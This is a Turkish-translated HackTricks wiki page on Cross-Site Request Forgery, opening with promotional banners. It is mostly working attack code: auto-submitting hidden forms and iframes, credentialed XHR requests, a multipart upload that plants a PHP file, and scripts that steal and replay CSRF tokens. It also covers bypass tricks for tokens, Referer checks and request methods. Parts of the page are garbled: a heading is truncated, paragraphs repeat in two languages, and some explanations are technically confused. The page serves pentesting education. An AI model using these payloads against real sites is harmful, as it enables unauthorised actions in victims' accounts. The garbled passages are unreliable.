# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>AWS hackleme becerilerinizi sıfırdan kahraman seviyesine yükseltin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi **HackTricks'te reklam vermek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **katkıda bulunun**.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve ödül avcılarıyla iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanını ve zorluklarını ele alan içeriklerle etkileşime geçin

**Gerçek Zamanlı Hack Haberleri**\
Hızlı tempolu hacking dünyasını gerçek zamanlı haberler ve içgörülerle takip edin

**En Son Duyurular**\
Yeni ödül avları başlatma ve önemli platform güncellemeleri hakkında bilgi sahibi olun

**Bize katılın** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugün en iyi hackerlarla işbirliği yapmaya başlayın!


## Cross-Site Request Forgery (CSRF) Açıklaması

**Cross-Site Request Forgery (CSRF)**, web uygulamalarında bulunan bir güvenlik açığı türüdür. Bu açık, kimlik doğrulaması yapılmış oturumları sömürerek, saldırganların masum kullanıcılar adına eylemler gerçekleştirmesine olanak tanır. Saldırı, bir kullanıcının, bir kurbanın platformuna giriş yapmışken, kötü niyetli bir siteyi ziyaret etmesiyle gerçekleştirilir. Bu site, JavaScript çalıştırarak, form göndererek veya resimleri alarak kurbanın hesabına istekler gönderir.

### CSRF Saldırısı için Önkoşullar
CSRF açığından yararlanmak için birkaç koşulun sağlanması gerekmektedir:

1. **Değerli Bir Eylem Belirleme**: Saldırgan, kullanıcının şifresini değiştirme, e-postasını değiştirme veya ayrıcalıklarını yükseltme gibi sömürülebilecek bir eylem bulmalıdır.
2. **Oturum Yönetimi**: Kullanıcının oturumu yalnızca çerezler veya HTTP Temel Kimlik Doğrulama başlığı aracılığıyla yönetilmelidir, diğer başlıklar bu amaçla manipüle edilemez.
3. **Tahmin Edilemez Parametrelerin Olmaması**: İstek, saldırıyı engelleyebilecek tahmin edilemez parametreler içermemelidir.

### CSRF'ye Karşı Savunma
CSRF saldırılarına karşı birkaç karşı önlem alınabilir:

* [**SameSite çerezleri**](hacking-with-cookies/#samesite): Bu özellik, tarayıcının çerezleri çapraz site istekleriyle birlikte göndermesini engeller. [SameSite çerezleri hakkında daha fazla bilgi](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Kurban sitesinin CORS politikası, saldırının gerçekleştirilebilirliğini etkileyebilir, özellikle saldırının kurban sitesinden gelen yanıtı okumayı gerektirdiği durumlarda. [CORS bypass hakkında bilgi edinin](cors-bypass.md).
* **Kullanıcı Doğrulama**: Kullanıcının niyetini doğrulamak için şifresini sormak veya bir captcha çözmek kullanılabilir.
* **Referrer veya Origin Başlıklarını Kontrol Etme**: Bu başlıkları doğrulamak, isteklerin güvenilir kaynaklardan geldiğinden emin olmaya yardımcı olabilir. Ancak, URL'lerin dikkatsizce oluşturulmasıyla kötü bir şekilde uygulanmış kontrolleri atlatmak mümkün olabilir, örneğin:
- `http://mal.net?orig=http://example.com` (URL güvenilir URL ile biter)
- `http://example.com.mal.net` (URL güvenilir URL ile başlar)
* **Parametre İsimlerini Değiştirme**: POST veya GET isteklerindeki parametre isimlerini değiştirmek, otomatik saldırıları önlemeye yardımcı olabilir.
* **CSRF Token'ları**: Her oturuma benzersiz bir CSRF token eklemek ve bu token'ı sonraki isteklerde gerektirmek, CSRF riskini önemli ölçüde azaltabilir. Token'ın etkinliği, CORS'un zorunlu kılınmasıyla artırılabilir.

Bu savunmaları anlamak ve uygulamak, web uygulamalarının güvenliğini ve bütünlüğünü sağlamak için önemlidir.

## Savunma Bypass

### POST'tan GET'e

Sömürmek istediğiniz formun bir **CSRF token ile POST isteği göndermeye hazırlandığını** belki de kontrol etmelisiniz, ancak bir **GET** isteğinin de **geçerli** olup olmadığını ve GET isteği gönderdiğinizde **CSRF token'ın hala doğrulandığını** kontrol etmelisiniz.

### Token eksikliği

Uygulamalar, token'lar var olduğunda bunları **doğrulamak için bir mekanizma** uygulayabilir. Ancak, token yokken doğrulama tamamen atlanıyorsa bir güvenlik açığı ortaya çıkar. Saldırganlar, token'ı taşıyan parametreyi sadece değerini değil, tamamen kaldırarak bu doğrulama sürecini atlayabilir. Bu, Cross-Site Request Forgery (CSRF) saldırısını etkili bir şekilde gerçekleştirmelerine olanak tanır.

### CSRF token'ı kullanıcı oturumuna bağlı değil

CSRF token'larını kullanıcı oturumlarına bağlamayan uygulamalar önemli bir güvenlik riski oluşturur. Bu sistemler, her tokenin başlatan oturuma bağlı olduğunu sağlamak yerine tokenları bir **genel havuzda** doğrular.

Saldırganlar bunu nasıl sömürür:

1. Kendi hesaplarını kullanarak **kimlik doğrulama** yaparlar.
2. **Genel havuzdan geçerli bir CSRF token** alırlar.
3. Bu token'ı bir kurban üzerindeki CSRF saldırısında **kullanırlar**.

Bu güvenlik açığı, uygulamanın **yetersiz token doğrulama mekanizmasını** sömürerek saldırganların kurban adına yetkisiz istekler yapmasına olanak tanır.

### Yöntem atlatma

Eğer istek "**garip**" bir **yöntem** kullanıyorsa, **yöntem geçersizleştirme işlevinin** çalışıp çalışmadığını kontrol edin.
Örneğin, **PUT** yöntemi kullanılıyorsa, **POST** yöntemini deneyebilir ve şunu gönderebilirsiniz: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Bu ayrıca **\_method parametresini bir POST isteği içine yerleştirerek** veya **başlıkları kullanarak** çalışabilir:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Ö
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Not et ki, **csrf belirteci oturum çereziyle ilişkiliyse bu saldırı çalışmayacaktır** çünkü kurbanın oturumunu ayarlamanız gerekecek ve bu nedenle kendinize saldırı yapmış olacaksınız.
{% endhint %}

### Content-Type değişikliği

[**Burada**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) belirtildiği gibi, **POST** yöntemini kullanarak **önişlem** isteklerini önlemek için izin verilen Content-Type değerleri şunlardır:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Ancak, **sunucunun mantığı** kullanılan **Content-Type**'a bağlı olarak değişebilir, bu nedenle bahsedilen değerleri ve **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ gibi diğer değerleri denemelisiniz.

Örnek (buradan alınmıştır: [buradan](https://brycec.me/posts/corctf\_2021\_challenges)) JSON verilerini text/plain olarak gönderme:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### JSON Verileri için Preflight İsteklerini Atlatma

JSON verilerini POST isteği aracılığıyla göndermeye çalışırken, HTML formunda `Content-Type: application/json` kullanmak doğrudan mümkün değildir. Benzer şekilde, bu içerik türünü kullanarak `XMLHttpRequest` kullanmak bir ön uçuş isteği başlatır. Bununla birlikte, sunucunun Content-Type'dan bağımsız olarak JSON verilerini işleyip işlemediğini kontrol etmek için bu sınırlamayı potansiyel olarak atlamak için stratejiler vardır:

1. **Alternatif İçerik Türleri Kullanma**: Formda `enctype="text/plain"` olarak ayarlayarak `Content-Type: text/plain` veya `Content-Type: application/x-www-form-urlencoded` kullanın. Bu yaklaşım, sunucunun Content-Type'dan bağımsız olarak veriyi kullanıp kullanmadığını test eder.

2. **İçerik Türünü Değiştirme**: Bir ön uçuş isteği tetiklemeden, sunucunun içeriği JSON olarak tanımasını sağlamak için veriyi `Content-Type: text/plain; application/json` ile gönderebilirsiniz. Bu, bir ön uçuş isteği başlatmaz, ancak sunucu `application/json`'ı kabul etmek için yapılandırılmışsa doğru şekilde işleyebilir.

3. **SWF Flash Dosyası Kullanımı**: Daha az yaygın ancak mümkün olan bir yöntem, bu tür kısıtlamaları atlamak için bir SWF flash dosyası kullanmaktır. Bu teknik hakkında daha ayrıntılı bilgi için [bu yazıya](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937) başvurun.

### Referrer / Origin Kontrolünü Atlama

**Referrer Başlığını Engelleme**

Uygulamalar, 'Referer' başlığını yalnızca var olduğunda doğrulayabilir. Tarayıcının bu başlığı göndermesini engellemek için aşağıdaki HTML meta etiketi kullanılabilir:
```xml
<meta name="referrer" content="never">
```
Bu, bazı uygulamalardaki doğrulama kontrollerini atlayarak 'Referer' başlığının atlanmasını sağlar.

**Regexp atlatmaları**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrer'ın içindeki parametrelerle birlikte göndereceği URL'de sunucunun alan adını ayarlamak için şunu yapabilirsiniz:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD yöntemi bypass**

[**Bu CTF çözümünde**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) ilk bölümde, [Oak'in kaynak kodunda](https://github.com/oakserver/oak/blob/main/router.ts#L281), bir yönlendirici **HEAD isteklerini GET istekleri olarak işlemlemek üzere ayarlanmış** - bu, Oak'e özgü olmayan yaygın bir çözüm yöntemidir. HEAD isteklerini işleyen özel bir işleyici yerine, bunlar sadece GET işleyiciye verilir ve uygulama yanıt gövdesini kaldırır.

Bu nedenle, eğer bir GET isteği sınırlanıyorsa, sadece **GET isteği olarak işlenecek bir HEAD isteği gönderebilirsiniz**.

## **Exploit Örnekleri**

### **CSRF Token'inin Exfiltrasyonu**

Eğer bir **CSRF tokeni** savunma olarak kullanılıyorsa, [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) zafiyeti veya [**Dangling Markup**](dangling-markup-html-scriptless-injection/) zafiyeti kullanarak onu **exfiltrate** etmeyi deneyebilirsiniz.

### **HTML etiketleri kullanarak GET isteği**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Diğer HTML5 etiketleri, otomatik olarak bir GET isteği göndermek için kullanılabilir:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET isteği

Form GET isteği, bir web formu aracılığıyla verilerin sunucuya gönderilmesi için kullanılan bir HTTP isteği türüdür. Bu istek, URL'nin bir parçası olarak verileri taşır ve sunucuya gönderilir. Form GET isteği, kullanıcının tarayıcısında URL'nin değişmesine neden olur ve bu nedenle tarayıcının geçmişinde görüntülenebilir.

Form GET isteği, genellikle verilerin sunucuya gönderilmesi gerektiğinde kullanılır, ancak bu istek türü güvenlik açıklarına neden olabilir. Özellikle Cross-Site Request Forgery (CSRF) saldırılarına karşı savunmasızlık oluşturabilir.

CSRF saldırıları, bir saldırganın kullanıcının tarayıcısında yetkilendirilmiş bir oturum açarak, kullanıcının istemeden istenmeyen işlemleri gerçekleştirmesine neden olmasını amaçlar. Bu saldırı türünde, saldırgan, kullanıcının tarayıcısında bir form GET isteği oluşturarak, kullanıcının hesabında istenmeyen değişiklikler yapabilir.

Bu nedenle, web uygulamalarının CSRF saldırılarına karşı korunması önemlidir. Bu korumayı sağlamak için, web uygulamaları genellikle CSRF token'ları kullanır. CSRF token'ları, her form isteği için benzersiz bir değer içeren gizli bir alan olarak eklenir. Sunucu, form isteğini alırken bu token'ı kontrol eder ve isteğin güvenilir bir kaynaktan geldiğini doğrular.

Form GET isteği, web uygulamalarının güvenliğini sağlamak için dikkatlice ele alınmalı ve gerekli önlemler alınmalıdır.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST isteği

Form POST isteği, bir web formu aracılığıyla sunucuya veri göndermek için kullanılan bir HTTP isteği türüdür. Bu istek, kullanıcının tarayıcısında doldurulan bir formun verilerini sunucuya iletmek için kullanılır. Form POST isteği, genellikle kullanıcı tarafından yapılan bir eylem sonucunda tetiklenir, örneğin bir düğmeye tıklama veya bir formu gönderme.

Form POST isteği, HTTP POST yöntemini kullanır ve isteğin gövdesinde form verilerini taşır. Bu veriler, formdaki alanların adı ve değeri olarak temsil edilir. Sunucu, bu verileri alır ve işler, genellikle veritabanına kaydetmek veya başka bir işlem yapmak için kullanılır.

Form POST isteği, Cross-Site Request Forgery (CSRF) saldırılarına karşı savunmasız olabilir. Bu tür saldırılar, bir saldırganın kullanıcının tarayıcısında istenmeyen bir form POST isteği göndermesini sağlayarak kullanıcının hesabını ele geçirmesine veya yetkisiz işlemler yapmasına olanak tanır. Bu nedenle, web uygulamalarının CSRF saldırılarına karşı korunması için uygun önlemler alması önemlidir.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Iframe üzerinden Form POST isteği

An attacker can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by tricking a victim into submitting a form through an invisible iframe. This technique is commonly used to perform unauthorized actions on behalf of the victim without their knowledge.

To execute this attack, the attacker creates a malicious webpage that contains an invisible iframe. The iframe is then loaded with a webpage that hosts a form. The form is pre-filled with the necessary data to perform the desired action, such as changing the victim's password or making a financial transaction.

When the victim visits the attacker's webpage, the iframe automatically submits the form without the victim's consent or knowledge. Since the victim is already authenticated to the targeted website, the request appears legitimate, and the action is executed.

To protect against this type of attack, web developers should implement measures such as using anti-CSRF tokens, which require a unique token to be included with each form submission. Additionally, users should be cautious when clicking on unfamiliar links or visiting suspicious websites to minimize the risk of falling victim to CSRF attacks.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST isteği**

Ajax POST isteği, web uygulamalarında veri göndermek için kullanılan bir tekniktir. Bu istek, kullanıcının farkında olmadığı bir şekilde gerçekleştirilebilir ve Cross-Site Request Forgery (CSRF) saldırıları için kullanılabilir.

Bu saldırı türünde, saldırgan hedef web uygulamasına bir istek gönderirken, kullanıcının tarayıcısında oturum açık olduğu bir siteyi hedefler. Bu istek, kullanıcının kimlik doğrulamasını kullanarak gerçekleştirilir ve kullanıcının bilgisi olmadan yapılır.

Saldırgan, hedef web uygulamasında bir form veya başka bir etkileşimli öğe oluşturarak, kullanıcının tarayıcısında oturum açık olan bir siteye yönlendirir. Bu öğe, saldırganın kontrolü altındaki bir URL'ye bir POST isteği yapar. Bu istek, kullanıcının tarayıcısında oturum açık olan siteye gönderilir ve kullanıcının kimlik doğrulaması kullanılarak gerçekleştirilir.

Bu saldırı türünden korunmanın bir yolu, web uygulamasında CSRF token kullanmaktır. CSRF token, her istek için benzersiz bir değerdir ve kullanıcının tarayıcısında saklanır. Bu token, istek gönderilirken kontrol edilir ve isteğin geçerli olup olmadığını doğrulamak için kullanılır. Bu sayede, saldırganın CSRF saldırısı gerçekleştirmesi engellenir.
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST isteği

Multipart/form-data POST isteği, web uygulamalarında dosya yükleme işlemlerini gerçekleştirmek için kullanılan bir HTTP isteği türüdür. Bu istek türü, form verilerini ve dosyaları aynı anda sunucuya göndermek için kullanılır.

Bu istek türü, genellikle dosya yükleme formlarında kullanılır ve form verileri ve dosyaları ayrı ayrı parçalara bölerek gönderir. Bu sayede sunucu, form verilerini ve dosyaları ayrı ayrı işleyebilir.

Multipart/form-data POST isteği, aşağıdaki adımları izler:

1. İstek başlığına `Content-Type: multipart/form-data` eklenir.
2. İstek gövdesi, her bir form alanı ve dosya için ayrı bir parça (part) olarak oluşturulur.
3. Her bir parça, `Content-Disposition` başlığı ile birlikte gönderilir. Bu başlık, parçanın türünü (form alanı veya dosya), adını ve diğer ilgili bilgileri içerir.
4. Her bir parça, `Content-Type` başlığı ile birlikte gönderilir. Bu başlık, parçanın içeriğinin türünü belirtir (örneğin, metin, resim, video).
5. Her bir parça, parçanın içeriğini içeren gövdeyle birlikte gönderilir.

Multipart/form-data POST isteği, dosya yükleme işlemlerinde kullanılan yaygın bir yöntemdir ve web uygulamalarının güvenliğini değerlendirirken dikkate alınması gereken bir konudur.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST isteği v2

Bu teknik, bir web uygulamasına multipart/form-data POST isteği göndererek Cross-Site Request Forgery (CSRF) saldırısı gerçekleştirmek için kullanılır. Bu saldırı, bir kullanıcının istemeden veya farkında olmadan istenmeyen bir eylemi gerçekleştirmesine neden olur.

#### Saldırı Aşamaları

1. Hedef web uygulamasının hedeflenen işlevselliği belirlenir.
2. Saldırgan, hedef web uygulamasında bir form oluşturur ve bu formun hedeflenen işlevselliği tetikleyeceği bir POST isteği oluşturur.
3. Saldırgan, bu formu bir web sayfasına yerleştirir ve kullanıcıları bu sayfaya yönlendirir.
4. Kullanıcı, saldırganın hazırladığı sayfayı ziyaret eder ve formu gönderir.
5. Hedef web uygulaması, kullanıcının gönderdiği isteği doğrular ve hedeflenen işlevselliği gerçekleştirir.
6. Saldırgan, hedeflenen işlevselliğin gerçekleştirildiğini doğrulamak için saldırı sonrası bir kanal kullanır.

#### Saldırı Önlemleri

Web uygulamaları, CSRF saldırılarına karşı korunmak için aşağıdaki önlemleri almalıdır:

1. CSRF token kullanımı: Web uygulamaları, her istek için benzersiz bir CSRF token oluşturmalı ve bu token'ı kullanarak istekleri doğrulamalıdır.
2. SameSite çerez özelliği: Web uygulamaları, SameSite çerez özelliğini kullanarak tarayıcının çerezleri yalnızca aynı siteye yapılan isteklerde göndermesini sağlamalıdır.
3. Referer kontrolü: Web uygulamaları, Referer başlığını kullanarak gelen isteklerin kaynağını doğrulamalıdır.
4. İstek doğrulama: Web uygulamaları, kullanıcıların isteklerini doğrulamak için güvenli yöntemler kullanmalıdır.

Bu önlemler, web uygulamalarının CSRF saldırılarına karşı daha güvenli hale gelmesini sağlar.
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### İçeriden bir iframe içinden Form POST isteği

If an application allows embedding its pages in an iframe, it may be vulnerable to Cross-Site Request Forgery (CSRF) attacks. This occurs when an attacker tricks a victim into submitting a malicious form within an iframe, causing the victim's browser to unknowingly perform unwanted actions on the application.

Bir uygulama, sayfalarını bir iframe içine yerleştirmeye izin veriyorsa, Cross-Site Request Forgery (CSRF) saldırılarına karşı savunmasız olabilir. Bu, bir saldırganın bir kurbanı, bir iframe içinde kötü amaçlı bir form göndermeye kandırmasıyla gerçekleşir ve kurbanın tarayıcısının istenmeyen eylemleri bilmeden uygulamada gerçekleştirmesine neden olur.

To exploit this vulnerability, the attacker can create a webpage with an iframe that loads the target application's page containing a form. The attacker can then use JavaScript to automatically submit the form with malicious data when the victim visits the attacker's webpage.

Bu zafiyeti sömürmek için saldırgan, hedef uygulamanın bir form içeren sayfasını yükleyen bir iframe içeren bir web sayfası oluşturabilir. Saldırgan, kurbanın saldırganın web sayfasını ziyaret ettiğinde kötü amaçlı verilerle formu otomatik olarak göndermek için JavaScript'i kullanabilir.

When the victim submits the form, the request is sent from the victim's browser, appearing as a legitimate action. The target application, unaware of the attack, processes the request and performs the desired action, such as changing the victim's account settings or making a purchase on their behalf.

Kurban formu gönderdiğinde, istek kurbanın tarayıcısından gönderilir ve meşru bir eylem gibi görünür. Saldırıdan habersiz olan hedef uygulama, isteği işler ve kurbanın hesap ayarlarını değiştirme veya onlar adına bir satın alma gibi istenen eylemi gerçekleştirir.

To prevent this type of attack, developers should implement measures such as using anti-CSRF tokens, which are unique tokens embedded in forms to validate the authenticity of the request. Additionally, the target application should enforce the SameSite attribute for cookies to restrict their usage within iframes.

Bu tür bir saldırıyı önlemek için geliştiriciler, isteğin otantikliğini doğrulamak için formlara gömülü benzersiz tokenler olan anti-CSRF tokenlerini kullanma gibi önlemler uygulamalıdır. Ek olarak, hedef uygulama, çerezlerin iframe'ler içinde kullanımını sınırlamak için SameSite özniteliğini zorlamalıdır.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF Token'ı Çalma ve POST İsteği Gönderme**

Bir Cross-Site Request Forgery (CSRF) saldırısı gerçekleştirmek için, hedef web uygulamasının CSRF korumasını aşmanız gerekmektedir. Bu korumayı aşmak için, öncelikle hedef web uygulamasının CSRF token'ını çalmalısınız. CSRF token, web uygulamasının güvenlik önlemi olarak kullanılan bir tür kimlik doğrulama mekanizmasıdır.

CSRF token'ını çalmak için, hedef web uygulamasına bir istek göndererek token'ı elde etmeniz gerekmektedir. Bu isteği göndermek için, hedef web uygulamasının sayfasını ziyaret eden bir kullanıcı gibi davranmanız gerekmektedir. Bu nedenle, hedef web uygulamasının sayfasını içeren bir HTML sayfası oluşturmanız gerekmektedir.

HTML sayfasını oluşturduktan sonra, sayfayı hedef web uygulamasına yüklemeniz gerekmektedir. Bu sayede, hedef web uygulaması tarafından oluşturulan CSRF token'ı çalabilirsiniz. Çalınan CSRF token'ı kullanarak, hedef web uygulamasına bir POST isteği gönderebilirsiniz.

POST isteği göndermek için, hedef web uygulamasının hedef URL'sini ve gerekli parametreleri belirlemeniz gerekmektedir. Ayrıca, isteği gönderirken çalınan CSRF token'ını da kullanmanız gerekmektedir. Bu sayede, hedef web uygulaması tarafından doğrulanan bir istek göndermiş olursunuz.

CSRF saldırısı gerçekleştirmek için çalınan CSRF token'ı kullanarak bir POST isteği göndermek, hedef web uygulamasında istenmeyen işlemlerin gerçekleştirilmesine neden olabilir. Bu nedenle, web uygulamalarının CSRF korumasını aşmak için bu yöntemi kullanmak etik dışıdır ve yasal sonuçları olabilir.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF Token'ı çalma ve bir iframe, bir form ve Ajax kullanarak Post isteği gönderme**

Bir Cross-Site Request Forgery (CSRF) saldırısı gerçekleştirmek için hedef web uygulamasının CSRF token'ını çalmak ve bu tokenı kullanarak bir Post isteği göndermek mümkündür. Bu saldırıyı gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:

1. İlk olarak, hedef web uygulamasının kaynak kodunu inceleyin ve CSRF token'ının nasıl oluşturulduğunu ve nerede saklandığını belirleyin. Genellikle bu token, bir formun gizli bir alanında veya bir HTTP başlığında bulunur.

2. CSRF token'ını çalmak için, bir iframe oluşturun ve hedef web uygulamasının sayfasını bu iframe içinde yükleyin. İframe, hedef web uygulamasının oturum açmış kullanıcısının tarayıcısında görünür olmalıdır.

3. İframe içindeki JavaScript kodunu kullanarak, hedef web uygulamasının sayfasındaki CSRF token'ını alın. Bu tokenı bir değişkene kaydedin.

4. Ardından, bir form oluşturun ve bu formu hedef web uygulamasının sayfasına göndermek için kullanın. Formun içine, hedef web uygulamasının hedeflenen Post isteği için gereken parametreleri ekleyin. Ayrıca, formun gizli bir alanına çaldığınız CSRF token'ını ekleyin.

5. Formu otomatik olarak göndermek için JavaScript kullanın. Bu işlemi Ajax ile yapabilirsiniz. Ajax isteği, hedef web uygulamasının Post isteğini gerçekleştirmesini tetikleyecektir.

Bu yöntemle, hedef web uygulamasının oturum açmış kullanıcısı, istemeden ve farkında olmadan Post isteğini gerçekleştirecektir. Bu sayede, saldırgan hedef web uygulamasında istediği işlemleri gerçekleştirebilir.

Bu saldırıyı gerçekleştirmek için, hedef web uygulamasının güvenlik açıklarını tespit etmek ve hedef web uygulamasının kaynak kodunu incelemek önemlidir. Ayrıca, bu saldırıyı gerçekleştirmek yasa dışıdır ve yalnızca etik hackerler tarafından yasal izinlerle gerçekleştirilmelidir.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
